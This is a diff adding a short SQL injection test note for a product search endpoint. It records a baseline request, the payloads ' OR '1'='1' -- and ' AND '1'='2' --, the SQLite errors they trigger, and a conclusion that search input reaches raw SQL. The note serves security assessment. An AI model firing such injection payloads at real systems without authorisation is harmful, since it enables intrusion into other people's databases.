@@ -1,0 +1,16 @@
+SQL Injection Validation - Product Search
+Baseline:
+GET /rest/products/search?q=zzzzzz
+Result: HTTP 200, empty data array.
+Payload:
+GET /rest/products/search?q=' OR '1'='1' --
+Result:
+HTTP 500
+SQLITE_ERROR: incomplete input
+Control payload:
+GET /rest/products/search?q=' AND '1'='2' --
+Result:
+HTTP 500
+SQLITE_ERROR: incomplete input
+Conclusion:
+User-controlled search input reaches a raw SQL statement and can alter the SQL parser behavior, producing a database error. Boolean-based data extraction was not demonstrated by these payloads.
